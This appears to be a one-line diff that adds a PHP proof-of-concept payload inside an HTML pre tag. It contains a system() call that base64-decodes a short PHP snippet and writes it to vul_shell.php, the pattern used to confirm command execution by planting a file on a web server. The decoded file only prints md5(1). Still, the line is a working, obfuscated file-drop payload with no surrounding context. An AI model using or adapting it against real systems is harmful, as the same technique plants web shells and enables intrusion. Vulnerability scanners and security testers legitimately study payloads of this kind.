@@ -1,0 +1,1 @@
+<pre>system('echo PD9waHAgIGVjaG8gbWQ1KDEpOz8+Cg== | base64 -d > vul_shell.php')</pre>
